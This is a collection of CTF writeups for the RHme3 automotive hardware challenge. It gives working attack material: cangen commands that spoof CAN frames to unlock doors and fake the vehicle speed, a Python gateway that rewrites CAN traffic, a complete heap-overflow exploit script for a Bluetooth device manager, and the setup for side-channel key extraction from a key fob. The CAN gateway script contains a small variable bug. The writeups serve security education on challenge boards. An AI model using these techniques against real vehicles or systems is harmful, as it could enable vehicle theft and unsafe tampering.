<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-haramori
description: CTF writeups and security challenges by haramori.
---

# Writeups by haramori

Source repository: `/repos/haramori`

## Repository Index

- rhme3/README.md
- rhme3/Challenges/Back_to_the_Future.md
- rhme3/Challenges/Bluetooth_Device_Manager.md
- rhme3/Challenges/CAN_Opener.md
- rhme3/Challenges/Car_Crash.md
- rhme3/Challenges/It's_a_Kind_of_Magic_solution_1.md
- rhme3/Challenges/It's_a_Kind_of_Magic_solution_2.md
- rhme3/Challenges/Phonic_Frenzy.md
- rhme3/Challenges/Race_of_a_Lifetime.md
- rhme3/Challenges/Ransom_2.0.md
- rhme3/Challenges/Tracing_the_Traces.md
- rhme3/Preparation/BBB_CAN_setup.md
- rhme3/Preparation/RHme3_board_analysis.md
- rhme3/Preparation/debugging_raw_binaries.md

## Writeup Content


### File: rhme3/README.md

# RHme3 CTF writeups

[RHme3](https://rhme.riscure.com/3/news) (RHme 2017) is an automotive CTF created by [Riscure](https://www.riscure.com/) and [Argus Cyber Security](https://argus-sec.com/).

## Preparation

* [RHme3 board analysis and preparation](Preparation/RHme3_board_analysis.md)
* [Beaglebone Black CAN setup](Preparation/BBB_CAN_setup.md)
* [Debugging AVR XMEGA raw binaries](Preparation/debugging_raw_binaries.md)

## Solved challenges

* [Tracing the Traces](Challenges/Tracing_the_Traces.md) (Qualifying Round)
* [Back to the future](Challenges/Back_to_the_Future.md)
* [Bluetooth Device Manager](Challenges/Bluetooth_Device_Manager.md)
* [CAN Opener](Challenges/CAN_Opener.md)
* [It's a Kind of Magic, solution 1](Challenges/It's_a_Kind_of_Magic_solution_1.md)
* [It's a Kind of Magic, solution 2](Challenges/It's_a_Kind_of_Magic_solution_2.md)
* [Phonic Frenzy](Challenges/Phonic_Frenzy.md)
* [Race of a Lifetime](Challenges/Race_of_a_Lifetime.md)
* [Ransom 2.0](Challenges/Ransom_2.0.md)

## Solved challenges, post-CTF

A few things I didn't quite finish in time...

* Auto-psy (In Progress)
* [Car Crash](Challenges/Car_Crash.md)



### File: rhme3/Challenges/Back_to_the_Future.md

# [Back to the Future](https://rhme.riscure.com/3/challenge?id=14)

Controller Area Network - 250pts

## Challenge text

Our intelligence suggests that the DeLorean we previously recovered is capable of time travel.
According to the documents in our possession the time travel functionality is activated as soon as a specific ECU within the vehicle maintains a velocity of exactly 88 miles per hour for at least a few seconds. We rely on your CAN bus expertise to trick the time-travel ECU into thinking it is travelling at the right speed; again, the vehicle dashboard we restored should be of use.

Best of luck.

The Dashboard app was available during the CTF.

Challenge developed by Argus Cyber Security.

## Solution

### Solution overview

The solution to this challenge involves identifying and rewriting CAN packets that indicate speed.  A CAN bridge will be needed to ensure that all packets are intercepted and rewritten.

### Preparation

If you haven't done so already, prepare your boards for working with CAN using these guides:
* [RHme3 board analysis and preparation](../Preparation/RHme3_board_analysis.md)
* [Beaglebone Black CAN setup](../Preparation/BBB_CAN_setup.md)

Make the following connections:
* For now, connect the two ECUs on the RHme3 board using jumpers.  We'll remove these later to separate the two channels.
* Connect one of the CAN transcievers on the Beaglebone Black to the RHme3 ECUs using twisted pair wiring.

![Single CAN Hookup](../Images/can_hookup_single.jpg)

Determine the serial port used for RHme3 board, then start up the Dashboard app:

	> cd rhme3dash-master; dashboard.py COM42
	$ cd rhme3dash-master; dashboard.py /dev/ttyUSB0

### Analysis

A quick analysis using cansniffer on the Beaglebone Black shows that the second data byte of CAN ID 23 seems to follow the movement of the dashboard speedometer.  In this case, 0x24 is 36 mph.

	$cansniffer -c can0
	23  00 24 08 02 20

Let's attempt to rewrite this as 88 mph (0x58) and feed it back using cangen:

	$ cangen -I 23 -L 5 -D 0058080220 -g 10 -x can0

This brings the speed up to 88 mph on the dashboard, but packets indicating lower speeds keep bringing it back down into the 30s of mph.  This confirms that we're using the right CAN ID and byte, but we need to do something about the lower speed packets that keep the indicated speed from being consistent.

Hypothesis: The two ECUs on the RHme3 board are acting as independant devices that are communicating with each other.  Maybe we can wedge a gateway between them, and use the gateway to intercept and rewrite any packets with CAN ID 23.

Make the following connections:
* Disconnect the two ECUs on the RHme3 board by removing the jumpers.
* Connect both of the CAN transcievers on the Beaglebone Black to the RHme3 ECUs using twisted pair wiring.  The connections should create two independant CAN buses: can0 on the Beaglebone Black connected to channel 1 on the RHme3 board, and can1 connected to channel 2.

![Double CAN Hookup](../Images/can_hookup_double.jpg)

With the two channels separated from each other, traffic goes quiet.  With the use of candump, temporarily jumpering the two channels to create bursts of traffic, and monitoring each channel individually, the originating channel of CAN ID 23 can be determined as channel 1.

	$ candump -L can0
	$ candump -L can1

### Attack

The following Python3 script can be run on the BBB to pass all traffic from channel 1 to channel 2, and rewrite all packets with CAN ID 23 for 88 mph.

	#!/usr/bin/python3

	import socket
	import struct
	import sys

	s_in = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
	s_out = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
	s_in.bind((sys.argv[1],))
	s_out.bind((sys.argv[2],))

	while True:
		# Get a packet
		frame,addr = s_in.recvfrom(16)
		id,dlc,data = struct.unpack("=IB3x8s",cf)
		data = bytearray(data[:dlc])

		# If the packet is ID 0x23, rewrite the speed byte
		if (id == 0x23):
			data[1] = 0x58
			frame = struct.pack("=IB3x8s",0x23,dlc,data)

		# Send it to the other ECU channel
		try:
			s_out.send(frame)
		except socket.error:
			print('Error sending CAN frame')

Run the script as follows:

	$ python3 can-gate.py can0 can1

This pegs the dashboard at 88 mph and displays the flag.

![Back to the Future Dashboard with FLAG](../Images/future_dashboard.png)



### File: rhme3/Challenges/Bluetooth_Device_Manager.md

# [Bluetooth Device Manager](https://rhme.riscure.com/3/challenge?id=20)

Exploitation - 200pts

In addition to the challenge binary, an unencrypted binary is included for reverse engineering.

## Challenge text

You have a basic car model and would like to enable some extra features? That navigation with traffic should be neat. Right. It is expensive, you know. Or not, if you can access the control interface. Try bluetooth this time. We think, it could be used for purposes other than making calls and playing MP3s.

## Solution

### Solution overview

The solution to this challenge involves a heap exploit initiated by a buffer overflow.  The exploit is used to overwrite a return pointer to redirect execution into a hidden function.  The hidden function has several mitigations to be overcome as well.  Countering the mitigations and redirecting execution is made possible by operationalizing the heap exploit into a reusable tool for reading and writing multiple locations in RAM.

### Static analysis

Disassemble the unencrypted binary as follows:

	$ avr-objcopy -I ihex -O elf32-avr bluetooth_device_manager.hex bluetooth_device_manager.elf
	$ avr-objdump -D bluetooth_device_manager.elf > bluetooth_device_manager.asm

Text section (by flash address|by PC address):

	Range 0x0000 to 0x2DCF|0x16E7
	0x0226|0x0113: init()
	0x0276|0x013B: get_input()
	0x0304|0x0182: control_interface()
	0x04C6|0x0263: connect_device()
	0x06B8|0x035C: disconnect_device()
	0x07D6|0x03EB: print_devices()
	0x08EC|0x0476: modify_device()
	0x0A8C|0x0546: main()
	0x0E24|0x0712: fputc()
	0x0EE8|0x0774: print()
	0x2DCC|0x16E6: halt()

Data section (by RAM address):

	Static range 0x2000 to 0x218E
	Dynamic range 0x218F to 0x3FFF
	0x2000: 0xDEAD
	0x2002: 0xBEEF
	0x2004: pointer to 0x08A0 (USARTC0)
	0x2006: pointer to 0x0640 (PORTC)
	0x2008: 0x0804
	0x200A: USARTC0 handle
	0x200C: pointer to 0x09B0 (USARTD1)
	0x200E: pointer to 0x0660 (PORTD)
	0x2010: 0x8040
	0x2012: USARTD1 handle
	0x201A: "such heap, much pr0!\n"
	0x2030: "why you pivot?\n"
	0x2040: "Your flag: "
	0x204C: "\n"
	0x204E: "Enter device name: \n"
	0x2063: "Enter pairing key: \n"
	0x2078: "Error: Could not find device with this id!\n"
	0x20A4: "%d. name: %s, key: %s\n"
	0x20BB: "%d. %s, %s\n"
	0x20C7: "Enter new name: "
	0x20D8: "Enter new key: "
	0x20E8: "Choose one of the following: \n"
	0x2107: "1. Print all connected devices\n"
	0x2127: "2. Connect new device\n"
	0x213E: "3. Disconnect device\n"
	0x2154: "4. Modify stored device\n"
	0x216D: "5. Exit\n"
	0x2176: "Enter number of device: "

The function at 0x0304|0x0182 is not called from anywhere.  It looks like it gives us the flag and is likely the control interface mentioned in the challenge text, so I'll call it control_interface().  I assume that our goal is to redirect execution to this function.

The string "such heap, much pr0!\n" is printed by control_interface(), so I assume that this challenge involves a heap exploit.

It looks as if control_interface() includes several checks that must be passed in order to get the flag:
* Check 1: The value at 0x2000 should be 0xFOOD.  The default value is 0xDEAD.
* Check 2: The value at 0x2192 should be the current frame pointer + 1.  Dynamic analysis provides insight regarding how to accomplish this (read more below).
* Check 3: The value at 0x2002 should be 0xBAAD.  The default value is 0xBEEF.

### Dynamic analysis

The following was accomplished by debugging the unencrypted binary using the hardware debugging configuration described in the [Debugging AVR XMEGA raw binaries](../Preparation/debugging_raw_binaries.md) guide.

Dynamic analysis reveals more information about how to pass the second check in control_interface():
* The correct check value in 0x2192 is ensured by entering control_interface() at PC address 0x0185.  This is accomplished by overwriting the return pointer of modify_device() with 0x0185.  Also note that unlike all other word values, return pointers should be big endian.
* The stack is randomized, so the location of the return pointer of modify_device() is not at a fixed address.  However, we can calculate this on the fly as: return_pointer = *(0x2192) - 2.

A heap is used starting at 0x225D.  Each device is represented in the heap using a master record and two strings.  Each master record is structured as follows:

	typedef struct {
		uint8         device_num;
		uint16        name_len;
		uint16        key_len;
		char          *name_ptr;
		char          *key_ptr;
		DEVICE_MASTER *next;
	} DEVICE_MASTER;

Each record in the heap, both master records and strings, consist of a two byte record length preceeding the actual record.  These prefix lengths are only used for tracking record sizes when deleted record are coalesced into bigger unused records.  The true field lengths for device names and pairing keys are stored in the master records.

Here's an example of what the heap looks like after adding three devices:

	       0x225D:       a6 22 00 00
	0x2261|0x2263: 04 00|69 22 93 22
	0x2267|0x2269: 0b 00|00 02 00 02 00 76 22 7a 22 7e 22  Master record for device 0
	0x2274|0x2276: 02 00|41 00                             Name: "A"
	0x2278|0x227A: 02 00|31 00                             Pairing key: "1"
	0x227C|0x227E: 0b 00|01 02 00 02 00 8b 22 8f 22 93 22  Master record for device 1
	0x2289|0x228B: 02 00|42 00                             Name: "B"
	0x228D|0x228F: 02 00|32 00                             Pairing key: "2"
	0x2291|0x2293: 0b 00|02 02 00 02 00 a0 22 a4 22 00 00  Master record for device 2
	0x229E|0x22A0: 02 00|43 00                             Name: "C"
	0x22A2|0x22A4: 02 00|33 00                             Pairing key: "3"

Here's a breakdown of the master record for device 0 in the example above:

	device_num =   0x00
	name_len =   0x0002
	key_len =    0x0002
	name_ptr =   0x2276
	key_ptr =    0x227a
	next =       0x227e

Our goal is to overwrite the lengths and pointers for the device name and pairing key within one of the master records, and then use those to read and write arbitrary locations in RAM.

A bug allows for any device name or pairing key to be replaced with a string two bytes larger when choosing to modify a device through the main menu.  The larger string will overwrite the size prefix of the heap record following the updated string.

### Attack

The bug itself is very simple, and not much can be done with it initially.  The following process will amplify the bug into an operational exploit:
* Add three Bluetooth devices (0 thru 2).
* Modify the name of device 0 to overwrite the recovery size of device 0's pairing key.
* Delete device 0.  The heap manager will coalesce all of device 0's fields and miscalculate the free space available for the combined field.
* Connect another device.  The oversized unused field will be used, but starting from the end of the oversized record, overlapping the master record for device 1.
* Determine the new device number for device 1 (e.g. device 34).
* Modify device 34 as needed to overwrite the field sizes and pointers for device 2.
* Modify device 2 to read and write arbitrary locations in RAM.
* Repeat the last two steps as needed.

A fully exploited heap looks as follows.  In this heap, device 34 at 0x227E controls field sizes and pointers within device 2, and device 2 at 0x2293 is used to read and write arbitrary locations in RAM.  Square brackets indicate overlapping areas.

	       0x225D:       a6 22 67 22
	0x2261|0x2263: 04 00|7e 22 78 22
	0x2267|0x2269: 05 00|00 00 00 02 00
	0x226E|0x2270: 02 00|34 00
	0x2272|0x2274: 02 00|44 00
	0x2276|0x2278: 0b 00|03 02 00 02[00 74 22 70 22 00 00]
	0x227C|0x227E: 00 74|22 70 22 00 00 8b 22 8f 22 93 22
	0x2289|0x228B: 02 00|58 58[58 58 00 58 0b 58 02 58 58 58 58 df 3d 00]
	0x228D|0x228F: 58 58|00 58
	0x2291|0x2293: 0b 58|02 58 58 58 58 df 3d 00 20 93 22
	0x229E|0x22A0: 02 00|43 00
	0x22A2|0x22A4: 02 00|33 00

Before using an exploited heap, there are a few things worth mentioning:
* The act of reading a value will erase it, so you may want to write it back out.
* Null bytes can be included in strings.
* The act of writing a value will include a null byte string terminator.  This may clobber something important.  This can be fixed by writing out more than needed until a good spot for a null byte is reached.

The following Python3 script implements the attack and gets the flag:

	import serial
	import re

	port = 'COM42'
	rate = 115200

	s = serial.Serial(port,rate,timeout=3.0,write_timeout=3.0,inter_byte_timeout=3.0)

	def print_b(message):
		print(message.decode(encoding='ascii',errors='ignore'))

	def read_until(match=b''):
		message = bytearray()
		while (True):
			data = s.read(1)
			if (len(data) == 0):
				break
			message += data
			if (len(match) > 0 and match in message):
				break
		print_b(message)
		return message

	def write(line):
		line = bytearray(line)
		line.extend(b'\n')
		s.write(line)

	def connect_device(name,key):
		write(b'2')
		read_until(b'Enter device name: \n')
		write(name)
		read_until(b'Enter pairing key: \n')
		write(key)
		read_until(b'5. Exit\n')

	def disconnect_device(number):
		write(b'3')
		read_until(b'Enter number of device: ')
		write(number)
		read_until(b'5. Exit\n')

	def modify_device(number,name,key):
		write(b'4')
		read_until(b'Enter number of device: ')
		write(number)
		read_until(b'Enter new name: ')
		write(name)
		read_until(b'Enter new key: ')
		write(key)
		return read_until(b'5. Exit\n')

	flag_pattern = re.compile(b'Your flag: (.+)')

	def check_for_flag(message):
		result = flag_pattern.search(message)
		if (result):
			flag = result.group(1)
			print(''.join([format(a,'02x') for a in flag]))

	name_pattern = re.compile(b'^\d{1,2}\. (.*), ([^\n]*)',re.M)

	def probe_device(number):
		write(b'4')
		read_until(b'Enter number of device: ')
		write(number)
		device_info = read_until(b'Enter new name: ')
		result = name_pattern.search(device_info)
		device_name = result.group(1)
		device_key = result.group(2)
		# The act of reading values erases them, so write them back out.
		write(device_name)
		read_until(b'Enter new key: ')
		write(device_key)
		read_until(b'5. Exit\n')
		return device_name

	# We need three initial devices (0 thru 2) for this attack.
	connect_device(b'A',b'1')
	connect_device(b'B',b'2')
	connect_device(b'C',b'3')

	# Corrupt the size fields to prepare to overlap a control record.
	modify_device(b'0',b'AA\x09',b'')
	disconnect_device(b'0')
	connect_device(b'D',b'4')

	# Craft the overlap.
	control = bytearray(b'XXXXXX\x0bX\x02XXXXZZ\x00\x22\x93\x22\x02')

	# Read the value in 0x2192.
	control[13] = 0x92
	control[14] = 0x21
	modify_device(b'34',control,b'')
	data = probe_device(b'2')

	# Take aim.
	control[13] = (data[0] - 2) % 256
	if (data[0] - 2 < 0):
		control[14] = data[1] - 1
	else:
		control[14] = data[1]
	control[16] = 0x20
	modify_device(b'34',control,b'')

	# Write out the payloads.  Write more than needed to land the null byte string terminator in a safe spot.
	check_for_flag(modify_device(b'2',b'\x01\x85',b'\x0D\xF0\xAD\xBA\xA0\x08\x40\x06\x04\x08\x04\x20\xB0\x09\x60\x06\x40\x80\x0C\x20'))



### File: rhme3/Challenges/CAN_Opener.md

# [CAN Opener](https://rhme.riscure.com/3/challenge?id=13)

Controller Area Network - 150pts

## Challenge text

Our operatives have recovered a DeLorean in the ruins of an old mid-west US town. It appears to be locked, but we have successfully accessed its internal communications channels. According to the little data we have, the DeLorean internally uses an archaic technology called CAN bus. We need you to analyze the communications and find a way to unlock the vehicle; once unlocked, recover the secret flag stored inside. We have reason to believe that vehicle entry should be a fairly easy challenge, but to aid you in this, we have restored and reconnected the vehicle dashboard.

Best of luck.

The Dashboard app was available during the CTF.

Challenge developed by Argus Cyber Security.

## Solution

### Solution overview

The solution to this challenge is basically to identify which CAN ID controls door locks, rewrite it, and manually feed it back onto the CAN bus.  It's that simple.

### Preparation

If you haven't done so already, prepare your boards for working with CAN using these guides:
* [RHme3 board analysis and preparation](../Preparation/RHme3_board_analysis.md)
* [Beaglebone Black CAN setup](../Preparation/BBB_CAN_setup.md)

Make the following connections:
* Connect the two ECUs on the RHme3 board using jumpers.
* Connect the Beaglebone Black to the RHme3 ECUs using twisted pair wiring via a CAN transciever such as a Carloop CAN Hitch.  The Beaglebone Black is capable of using two CAN transcievers, but you only need one for this challenge.

![Single CAN Hookup](../Images/can_hookup_single.jpg)

Determine the serial port used for RHme3 board, then start up the Dashboard app:

	> cd rhme3dash-master; dashboard.py COM42
	$ cd rhme3dash-master; dashboard.py /dev/ttyUSB0

### Analysis

A quick analysis using cansniffer on the Beaglebone Black shows that CAN ID 332 may be useful:

	$ cansniffer -c can0
	332  6C 6F 63 6B 00 00 00 00 lock....

### Attack

Let's attempt to rewrite this as "unlock" and feed it back using cangen:

	332  75 6E 6C 6F 63 6B 00 00 unlock..
	$ cangen -I 332 -L 8 -D 756E6C6F636B0000 -n 5 can0

On the dashboard, the door indicator lights up and the flag is displayed in the lower left corner.

![CAN Opener Dashboard with FLAG](../Images/can_opener_dashboard.png)



### File: rhme3/Challenges/Car_Crash.md

# [Car Crash](https://rhme.riscure.com/3/challenge?id=9)

Reverse Engineering - 500pts

In addition to the challenge binary, an unencrypted binary is included for reverse engineering.

## Challenge text

This ECU firmware dump, or what's left of it, was taken out of a crashed prototype car. We have to extract the logs from it to investigate the crash. Bad luck, we get some strange garbage printed instead.

Attached is a program you can reverse-engineer and a program you can test. Don't mix them up.

## Solution

### Solution overview

The encryption algorithm has a broken inverse sbox.  The unencrypted binary can be run on an alternate XMEGA under hardware debugger control, and the incorrect values manually fixed during the initial breakpoint at startup.  Decrypting the log works after continuing.

### Static analysis

Disassemble the unencrypted binary as follows:

	$ avr-objcopy -I ihex -O elf32-avr ecu_dump.hex ecu_dump.elf
	$ avr-objdump -D ecu_dump.elf > ecu_dump.asm

Text section (by flash address|by PC address):

	Range 0x0000 to 0x1D85
	0x01FC|0x00FE: init()
	0x040E|0x0207: key_schedule()
	0x0E04|0x0702: cipher()
	0x1134|0x089A: menu()
	0x11E2|0x08F1: decrypt()
	0x134A|0x09A5: main()
	0x15B4|0x0ADA: putchar()
	0x1668|0x0B34: printf()
	0x16A8|0x0B54: getchar()
	0x16FE|0x0B7F: get_input()
	0x1C40|0x0E20: len()
	0x1D82|0x0EC1: halt()

Data section (by RAM address):

	Static range 0x2000 to 0x23F7
	Dynamic range 0x23F8 to 0x3FFF
	0x2000: pointer to 0x08A0 (USARTC0)
	0x2002: pointer to 0x0640 (PORTC)
	0x2004: 0x0804
	0x2006: USARTC0 handle
	0x2008: pointer to 0x09B0 (USARTD1)
	0x200A: pointer to 0x0660 (PORTD)
	0x200C: 0x8040
	0x200E: USARTD1 handle
	0x2010: sbox (256 byte)
	0x2110: inv_sbox (256 byte)
	0x2210: ??? (16 byte)
	0x2220: "1. Decrypt EDR data\n"
	0x2235: "2. Print EDR data\n"
	0x2248: "3. ECU status\n"
	0x2257: "Decrypting data\n"
	0x2268: key (256 bit)
	0x2288: "%s\n"
	0x228C: "Black box connected\n"
	0x22A1: "Option: %d\n"
	0x22AD: "Already decoded!\n"
	0x22BF: "Car not found\n"
	0x22CE: "Have you tried turning it on and off again?\n"
	0x22FB: "Wrong input\n"
	0x2308: encrypted log

The encryption algorithm is not familiar, but it has many of the same features as other familiar symetric algorithms like AES, to include: key schedule, block cipher, sbox and inverse sbox.  The sbox is very similar to the sbox for Kuznyechik (RFC 7801).  However, on careful examination, the inverse sbox contains multiple 0x00 values.  As sboxes should only contain one of each possible value, we need to examine this carefully to determine how broken it is.  Fortunately, the inverse sbox can be recreated from scratch using the sbox.

The following Python3 script calculates a new inverse sbox, compares it with the existing inverse sbox, and points out each flaw and how to fix it.

	sbox = [
		0xfc,0xee,0x99,0xc6,0x80,0x6e,0xa2,0x53,0xfb,0x18,0xfa,0xda,0x22,0x13,0x96,0xdf,
		0xe9,0xaa,0xf0,0xd0,0x4e,0x61,0xd6,0x6c,0x84,0xae,0xf1,0x29,0x5b,0x54,0x11,0xcb,
		0x60,0x81,0x65,0x86,0xe2,0x56,0x7c,0x21,0xc4,0x58,0x79,0x94,0x19,0xdd,0x17,0x93,
		0xd9,0x59,0x9a,0xa5,0xe3,0xbd,0x1c,0x76,0x0d,0x0a,0x3b,0xd7,0xe6,0x09,0x41,0x5a,
		0x36,0x34,0x2c,0xc2,0xea,0xc8,0xdb,0x33,0xb6,0x2a,0x68,0x7f,0xfd,0x7e,0xce,0xcc,
		0xb5,0x70,0x9c,0x8a,0x4d,0xd1,0xab,0xc5,0xbf,0x3c,0x12,0x03,0xd3,0xf9,0x8b,0x14,
		0x1f,0x77,0x0f,0x6d,0x1a,0x7b,0x91,0x83,0xb7,0x9b,0xe0,0x6f,0xd2,0x43,0xb2,0xf4,
		0xe4,0xa9,0x5d,0x73,0xb0,0x35,0x5c,0x30,0xbb,0x1b,0x82,0x57,0x8d,0x24,0x9e,0xcf,
		0x02,0x23,0x2e,0x3a,0x3e,0x31,0x95,0x1e,0x45,0xeb,0x44,0xf6,0x7d,0xf5,0xb9,0x46,
		0x3d,0x0e,0xec,0xde,0x7a,0x0c,0x67,0x6b,0xdc,0xe8,0xb1,0x51,0x01,0xa1,0x98,0x05,
		0xa7,0x4a,0x2f,0x37,0x15,0x92,0x62,0x00,0x55,0xb8,0xa0,0x88,0x64,0x42,0x26,0x4b,
		0xad,0x4f,0x08,0x0b,0x27,0x89,0x5e,0xf3,0xc9,0x74,0xaf,0xe5,0x69,0x4c,0x07,0xa3,
		0x9f,0x16,0xb3,0x04,0x87,0xac,0x85,0xf7,0x75,0x72,0x25,0xef,0x5f,0x9d,0xed,0x10,
		0x78,0xc7,0xcd,0x48,0xd4,0x3f,0xf8,0xfe,0x8c,0x8f,0x39,0xd5,0xca,0xd8,0x52,0x6a,
		0x20,0x71,0xff,0xe1,0x2d,0x2b,0x47,0x50,0x1d,0x90,0xf2,0x06,0xbe,0x38,0x66,0xc1,
		0xc0,0xa6,0xe7,0x40,0xa8,0x28,0xb4,0x8e,0x49,0xba,0xa4,0xc3,0x32,0x97,0x63,0xbc]

	inv_sbox = [
		0xa7,0x9c,0x80,0x5b,0xc3,0x9f,0xeb,0xbe,0xb2,0x3d,0x39,0xb3,0x95,0x38,0x91,0x62,
		0xcf,0x1e,0x00,0x0d,0x5f,0xa4,0xc1,0x2e,0x09,0x2c,0x64,0x79,0x36,0xe8,0x87,0x60,
		0xe0,0x27,0x0c,0x81,0x00,0xca,0xae,0xb4,0xf5,0x1b,0x49,0xe5,0x42,0xe4,0x82,0xa2,
		0x77,0x85,0xfc,0x47,0x41,0x75,0x40,0xa3,0xed,0xda,0x83,0x3a,0x59,0x90,0x84,0xd5,
		0xf3,0x3e,0xad,0x6d,0x8a,0x88,0x8f,0xe6,0xd3,0xf8,0xa1,0xaf,0xbd,0x54,0x14,0xb1,
		0xe7,0x9b,0xde,0x07,0x1d,0xa8,0x25,0x7b,0x29,0x31,0x3f,0x1c,0x00,0x72,0xb6,0x00,
		0x20,0x15,0xa6,0xfe,0xac,0x22,0xee,0x96,0x4a,0xbc,0xdf,0x97,0x17,0x63,0x05,0x6b,
		0x51,0xe1,0xc9,0x73,0xb9,0x00,0x37,0x61,0xd0,0x2a,0x94,0x65,0x26,0x00,0x4d,0x4b,
		0x04,0x21,0x7a,0x67,0x18,0xc6,0x23,0xc4,0xab,0xb5,0x53,0x5e,0xd8,0x7c,0x00,0xd9,
		0xe9,0x66,0xa5,0x2f,0x2b,0x86,0x0e,0xfd,0x9e,0x02,0x32,0x69,0x52,0xcd,0x7e,0xc0,
		0xaa,0x9d,0x06,0xbf,0xfa,0x33,0xf1,0xa0,0xf4,0x71,0x11,0x56,0xc5,0xb0,0x00,0xba,
		0x74,0x9a,0x6e,0xc2,0xf6,0x50,0x48,0x68,0xa9,0x8e,0xf9,0x78,0xff,0x35,0xec,0x00,
		0xf0,0xef,0x43,0xfb,0x28,0x57,0x03,0xd1,0x45,0xb8,0xdc,0x1f,0x4f,0xd2,0x4e,0x7f,
		0x13,0x55,0x6c,0x5c,0xd4,0xdb,0x16,0x3b,0xdd,0x30,0x0b,0x46,0x98,0x2d,0x93,0x0f,
		0x6a,0xe3,0x24,0x34,0x70,0xbb,0x3c,0xf2,0x99,0x10,0x44,0x89,0x92,0xce,0x01,0xcb,
		0x12,0x1a,0xea,0xb7,0x6f,0x8d,0x8b,0x00,0xd6,0x5d,0x0a,0x08,0x00,0x4c,0xd7,0xe2]

	correct_inv_sbox = [None] * 256
	for i in range(256):
		correct_inv_sbox[sbox[i]] = i

	inv_sbox_addr = 0x2110
	for i in range(256):
		if (inv_sbox[i] != correct_inv_sbox[i]):
			print(hex(inv_sbox_addr + i),":",hex(inv_sbox[i]),"should be",hex(correct_inv_sbox[i]))

Which produces the following output:

	0x2122 : 0x0 should be 0x5a
	0x2134 : 0x0 should be 0x7d
	0x216c : 0x0 should be 0x76
	0x216f : 0x0 should be 0xcc
	0x2185 : 0x0 should be 0xc8
	0x218d : 0x0 should be 0x8c
	0x219e : 0x0 should be 0xf7
	0x21be : 0x0 should be 0x19
	0x21cf : 0x0 should be 0x58
	0x2207 : 0x0 should be 0xc7

### Attack

Debug the unencrypted binary on an alternate XMEGA using the hardware debugging configuration described in the [Debugging AVR XMEGA raw binaries](../Preparation/debugging_raw_binaries.md) guide.

Follow these steps to decrypt the log and get the flag:
1. In Atmel Studio 7, select the menu item: Debug > Start Debugging and Break.  At the breakpoint, the binary has already initialized and copied the data section from flash into RAM.
2. In the Memory window, select "data INTERNAL_SRAM".
3. Manually edit each of the broken bytes in the inverse sbox according to the table of fix values above.
4. Select the menu item: Debug > Continue.
5. In a serial terminal, select 1 to decrypt, then select 2 to print.

Here is the terminal session:

	Black box connected
	1. Decrypt EDR data
	2. Print EDR data
	3. ECU status
	1
	Option: 1
	Decrypting data
	1. Decrypt EDR data
	2. Print EDR data
	3. ECU status
	2
	Option: 2
	2018-01-12 18:12:52.024 ECU     ERR     CAN DECODER ERROR, SKIPPING MSG
	2018-01-12 18:12:52.353 ECU     WRN     CAN BUFFER FULL
	2018-01-12 18:12:52.494 ABS     ERR     ABS OFFLINE
	2018-01-12 18:12:54.950 ECU     DBG     DUMP SERVICE FLAG 2127259039de83ac134df7e4f84d99fc



### File: rhme3/Challenges/It's_a_Kind_of_Magic_solution_1.md

# [It's a Kind of Magic](https://rhme.riscure.com/3/challenge?id=10), solution 1

Side Channel Analysis - 200pts

## Challenge text

You managed to get a spare key fob for the car you like. However you want to duplicate it so that you can maintain your access to it. Through extensive reverse engineering, you figure out that the device accepts an input challenge performs AES-128 encryption (or decryption) and returns the response. It is also identified that the device operates on masked input and returns masked output. Extract the key so you can get free rides!

The device expects 18 bytes of input: the first byte should be either 0xAE (for encryption) or 0xAD (for decryption) followed by 16 bytes of data, followed by a newline.

## Solution

### Solution overview

This solution is based on the assumption that the mask is a semi-random 128 bit number that is XORed with both the input prior to the cipher block and the output after the cipher block.

The leakage model for the masked key should therefore be:

	HW:SboxOutput = hamming_weight(sbox(PT_byte ^ mask_byte ^ key_byte))
	HW:SboxOutput = hamming_weight(sbox(PT_byte ^ masked_key))

So HW:SboxOutput can be used to reveal the masked key.

This solution also relies on the encryption/decryption process repeatedly reusing an uninitialized buffer, which can be leveraged to reveal the mask by using carefully crafted input. Padding an incomplete block of data would help avoid this problem, but padding isn't used.

This will be a three stage attack:
* Perform an exploit attack to reveal the mask.
* Perform a CPA attack on the sbox output to reveal the masked key.
* XOR the mask with the masked key to reveal the key itself.

### Hardware setup

This solution is based on using the [ChipWhisperer Lite](https://newae.com/tools/chipwhisperer/).

If you haven't done so already, prepare the RHme3 board for side channel analysis according to the [RHme3 board analysis and preparation](../Preparation/RHme3_board_analysis.md) guide.

Replace the jumper at JP4 with a 4x4 breadboard, wired as follows:
* Measurement pin at UC
* 10 Ohm thin film shunt resistor from UC to Vcc
* 100 uF capacitor from Vcc to Gnd
* Breadboard UC to RHme-UC (via header extension)
* Breadboard Vcc to RHme-Vcc (via header extension)
* Breadboard Gnd to RHme-Gnd

![SCA Shunt Breadboard](../Images/sca_shunt_breadboard.jpg)

Connect the ChipWhisperer Lite (CWL) to the RHme3 board as follows:
* CWL-Gnd to RHme-Gnd
* CWL-3V3 to RHme-3V3
* CWL-Vref to RHme-IOref
* CWL-IO1 (as TX) to RHme RX
* CWL-IO2 (as RX) to RHme TX
* CWL-measure to Measurement pin on 4x4 breadboard.

The complete setup should look like this.

![SCA Hookup](../Images/sca_hookup.jpg)

### Analysis

* The CPU clock rate is 16 MHz based on viewing clocking artifacts in SPA.  The ADC clock should be run at 64 MHz (four times the CPU clock).
* Software crypto is assumed.  According to the XMEGA AU Manual [1], the XMEGA AES crypto module takes 375 cycles of the peripheral clock to complete one block of AES encryption.  With an ADC clock running at 64 MHz, a single block of encryption should take 1500 ADC samples.  One block as viewed in SPA takes far more ADC samples than this, so hardware crypto is probably not used.
* A 10 Ohm shunt resistor seems to be the largest value that doesn't cause the RHme3 board to constantly reset.
* The ChipWhisperer Lite seems to provide the cleanest power among many sources tried.
* Encrypted messages can be decrypted back to the original messages up until the RHme3 board is reset.  A new mask is assumed to be randomly selected every time the board is reset.  Because of this, the entire attack must take place without resetting the board.
* Message that include a value of 0x0A in any byte position will fail to encrypt/decrypt properly.  This will be misinterpreted as a newline character and will shorten the message.  It is assumed that only the message up to and including the newline byte is encrypted/decrypted, along with anything remaining in the buffer after the newline.
* Messages that are shorter than 16 bytes behave similarly.
* Additional testing reveals that the input buffer is reused without reinitializing it, and when a message shorter than 16 bytes or a message with a newline byte is used a portion of the previous message following the newline byte is revealed.  With a message of all zeros, we can exploit this to leak part of the mask.

